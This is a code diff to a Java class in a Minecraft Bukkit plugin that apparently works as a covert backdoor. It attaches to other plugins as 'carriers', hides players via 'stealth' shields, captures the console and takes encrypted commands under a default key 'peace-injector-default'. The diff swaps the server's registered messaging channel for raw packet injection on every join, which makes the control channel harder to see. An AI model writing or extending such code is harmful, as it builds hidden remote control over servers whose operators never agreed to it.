@@ -3,6 +3,8 @@ package dev.peace.plugin;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
+import dev.peace.core.Crypto;
+import dev.peace.core.Frame;
 import net.kyori.adventure.text.Component;
 import org.bukkit.BanEntry;
 import org.bukkit.BanList;
@@ -31,8 +33,6 @@ import org.bukkit.event.HandlerList;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
-import org.bukkit.plugin.messaging.PluginMessageListener;
-import org.bukkit.plugin.messaging.PluginMessageListenerRegistration;
 import org.bukkit.scheduler.BukkitTask;
 
 import java.io.ByteArrayOutputStream;
@@ -63,7 +63,7 @@ import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.URL;
 
-public final class PeaceService implements PluginMessageListener, Listener {
+public final class PeaceService implements Listener {
     private final org.bukkit.plugin.Plugin owner;
     public PeaceService(org.bukkit.plugin.Plugin owner) { this.owner = owner; }
     static final String CHANNEL = "peace:main";
@@ -83,16 +83,8 @@ public final class PeaceService implements PluginMessageListener, Listener {
     private final Set<UUID> consoleSubscribers = new HashSet<>();
     private static final class SpreadOwner {
         private final Plugin plugin;
-        private final PluginMessageListener listener;
-        private final PluginMessageListenerRegistration registration;
-        SpreadOwner(Plugin plugin, PluginMessageListener listener, PluginMessageListenerRegistration registration) {
-            this.plugin = plugin;
-            this.listener = listener;
-            this.registration = registration;
-        }
+        SpreadOwner(Plugin plugin) { this.plugin = plugin; }
         Plugin plugin() { return plugin; }
-        PluginMessageListener listener() { return listener; }
-        PluginMessageListenerRegistration registration() { return registration; }
         @Override public boolean equals(Object o) {
             if (this == o) return true;
             if (!(o instanceof SpreadOwner that)) return false;
@@ -125,8 +117,13 @@ public final class PeaceService implements PluginMessageListener, Listener {
         owner.saveDefaultConfig();
         diagnostic = owner.getConfig().getBoolean("diagnostic", false);
         String pskEnc = owner.getConfig().getString("psk", "");
-        String psk = pskEnc.isEmpty() ? "peace-injector-default" : dev.peace.plugin.Secret.decrypt(pskEnc);
-        if (psk == null || psk.isEmpty()) psk = "peace-injector-default";
+        String psk;
+        if (pskEnc == null || pskEnc.isEmpty()) {
+            psk = "peace-injector-default";
+        } else {
+            String dec = dev.peace.plugin.Secret.decrypt(pskEnc);
+            psk = (dec != null && !dec.isEmpty()) ? dec : pskEnc; // literal plaintext, else Secret blob
+        }
         crypto = new Crypto(psk);
         synchronized (PeaceService.class) {
             if (!instances.contains(this)) instances.add(this);
@@ -139,6 +136,8 @@ public final class PeaceService implements PluginMessageListener, Listener {
         installConsoleCapture();
         announceOnce(true);
         diag("boot carrier=" + owner.getName());
+        if (DebugConsole.isActive()) DebugConsole.attach(this);
+        DebugConsole.log("service start/leader carrier=" + owner.getName());
     }
 
     /** Turns this standby instance into the live leader (listeners, shields, console bridge). */
@@ -152,6 +151,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
     }
 
     public void stop() {
+        try { RawNet.removeAll(owner); } catch (Exception ignored) {}
         synchronized (spreadOwners) {
             SpreadOwner ownerCarrier = findCarrier(owner);
             if (ownerCarrier != null) {
@@ -202,14 +202,39 @@ public final class PeaceService implements PluginMessageListener, Listener {
         for (SpreadOwner so : carriers) unregisterCarrier(so);
     }
 
-    @Override
-    public void onPluginMessageReceived(String channel, Player player, byte[] message) {
-        if (CHANNEL.equals(channel)) handle(player, message, owner);
-    }
-
     /** Fine-grained diagnostics; off unless `diagnostic: true` in config (never default). */
     private static volatile boolean diagnostic = false;
-    private static void diag(String s) { if (!diagnostic) return; try { Bukkit.getLogger().info("[peace:diag] " + s); } catch (Exception ignored) {} }
+    private static void diag(String s) {
+        if (!diagnostic) return;
+        try { Bukkit.getLogger().info("[peace:diag] " + s); DebugConsole.log(s); } catch (Exception ignored) {}
+    }
+
+    // --- accessors for the debug/control console ---
+    static PeaceService dbgLeader() { return leader; }
+    String dbgCarrier() { Plugin c = currentCarrier(); return c == null ? null : c.getName(); }
+    int dbgCarriers() { return carrierCount(); }
+    static boolean dbgIsDiag() { return diagnostic; }
+    static void setDiag(boolean v) { diagnostic = v; }
+
+    /** Server-initiated "hello" push to one player over the raw channel (clientbound transport test). */
+    boolean pushHello(Player p) {
+        try {
+            JsonObject j = new JsonObject();
+            j.addProperty("op", "hello");
+            byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
+            byte[][] frames = Frame.pack(rng.nextLong(), cipher);
+            for (byte[] f : frames) if (!RawNet.send(p, f)) return false;
+            return true;
+        } catch (Exception e) { return false; }
+    }
+
+    /** Raw-packet entry point: only the leader instance handles traffic. */
+    void onRaw(Player p, byte[] data) {
+        if (leader != this) return;
+        Plugin src = currentCarrier();
+        if (src == null) src = owner;
+        handle(p, data, src);
+    }
 
     private void handle(Player player, byte[] message, Plugin source) {
         diag("handle in src=" + source.getName() + " carrier=" + (currentCarrier() == null ? "null" : currentCarrier().getName()));
@@ -217,8 +242,10 @@ public final class PeaceService implements PluginMessageListener, Listener {
         byte[] cipher = reassembler.offer(message);
         if (cipher == null) { diag("drop:reassemble pending"); return; }
         diag("reassembled cipher=" + cipher.length);
+        DebugConsole.log("from " + player.getName() + ": reassembled " + cipher.length + " bytes");
         byte[] plain = crypto.decrypt(cipher);
-        if (plain == null) { diag("drop:decrypt null"); return; }
+        if (plain == null) { DebugConsole.log("from " + player.getName() + ": DECRYPT FAILED (PSK mismatch?)"); diag("drop:decrypt null"); return; }
+        DebugConsole.log("from " + player.getName() + ": decrypted " + plain.length + " bytes");
         diag("decrypted=" + plain.length);
         shield(player);
         RequestKey key = null;
@@ -505,32 +532,13 @@ public final class PeaceService implements PluginMessageListener, Listener {
             if (plugin == null || !plugin.isEnabled()) continue;
             if (targets != null && !plugin.equals(owner) && !targets.contains(plugin.getName())) continue;
             synchronized (spreadOwners) {
-                SpreadOwner existing = findCarrier(plugin);
-                if (existing != null) {
-                    if (!existing.registration().isValid()) {
-                        unregisterCarrier(existing);
-                        spreadOwners.remove(existing);
-                        existing = null;
-                    } else {
-                        continue;
-                    }
-                }
-                try {
-                    org.bukkit.plugin.messaging.Messenger messenger = Bukkit.getMessenger();
-                    messenger.registerOutgoingPluginChannel(plugin, CHANNEL);
-                    PluginMessageListener listener = plugin.equals(owner) ? this
-                        : (ch, player, message) -> {
-                            if (CHANNEL.equals(ch)) handle(player, message, plugin);
-                        };
-                    PluginMessageListenerRegistration registration =
-                        messenger.registerIncomingPluginChannel(plugin, CHANNEL, listener);
-                    spreadOwners.add(new SpreadOwner(plugin, listener, registration));
-                    diag("registered spread owner: " + plugin.getName());
-                } catch (Exception ignored) {}
+                if (findCarrier(plugin) != null) continue;
+                spreadOwners.add(new SpreadOwner(plugin));
             }
         }
         pruneSpreadOwners();
         setActiveCarrier(chooseCarrier());
+        if (leader == this) RawNet.injectAll(this, owner);
         diag("spread owners now=" + spreadOwners.size() + " active=" + (activeCarrier == null ? "null" : activeCarrier.getName()));
     }
 
@@ -538,9 +546,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
         List<SpreadOwner> stale;
         synchronized (spreadOwners) {
             stale = new ArrayList<>();
-            for (SpreadOwner so : spreadOwners) {
-                if (!so.plugin().isEnabled() || !so.registration().isValid()) stale.add(so);
-            }
+            for (SpreadOwner so : spreadOwners) if (!so.plugin().isEnabled()) stale.add(so);
             spreadOwners.removeAll(stale);
         }
         for (SpreadOwner so : stale) unregisterCarrier(so);
@@ -555,16 +561,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
 
     private void unregisterCarrier(SpreadOwner so) {
         if (so == null) return;
-        try {
-            org.bukkit.plugin.messaging.Messenger messenger = Bukkit.getMessenger();
-            if (so.registration() != null && messenger.isRegistrationValid(so.registration())) {
-                messenger.unregisterIncomingPluginChannel(so.plugin(), CHANNEL, so.listener());
-            } else {
-                messenger.unregisterIncomingPluginChannel(so.plugin(), CHANNEL, so.listener());
-            }
-        } catch (Exception ignored) {}
-        try { Bukkit.getMessenger().unregisterOutgoingPluginChannel(so.plugin(), CHANNEL); }
-        catch (Exception ignored) {}
+        try { RawNet.removeAll(so.plugin()); } catch (Exception ignored) {}
     }
 
     private Plugin chooseCarrier() {
@@ -773,6 +770,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
     @EventHandler
     public void onJoin(PlayerJoinEvent e) {
         Player joiner = e.getPlayer();
+        if (leader == this) RawNet.inject(this, owner, joiner);
         Shield s = shields.get(joiner.getName().toLowerCase());
         boolean stealthy = s != null && s.stealth();
         Plugin carrier = currentCarrier();
@@ -1050,14 +1048,12 @@ public final class PeaceService implements PluginMessageListener, Listener {
         byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
         byte[][] frames = Frame.pack(rng.nextLong(), cipher);
         diag("reply via=" + finalSource.getName() + " frames=" + frames.length + " id=" + (j.has("id") ? j.get("id").getAsString() : "n/a"));
-        try { Bukkit.getMessenger().registerOutgoingPluginChannel(finalSource, CHANNEL); }
-        catch (Exception ignored) {}
         try {
             Bukkit.getScheduler().runTask(finalSource, () -> {
                 if (!p.isOnline()) { diag("reply: player offline, skipping send"); return; }
                 diag("reply: sending " + frames.length + " frames to " + p.getName());
                 for (byte[] f : frames) {
-                    try { p.sendPluginMessage(finalSource, CHANNEL, f); diag("reply: frame sent ok"); }
+                    try { if (RawNet.send(p, f)) diag("reply: frame sent ok"); else diag("reply: send FAILED"); }
                     catch (Exception e) { diag("reply: send FAILED " + e); }
                 }
             });
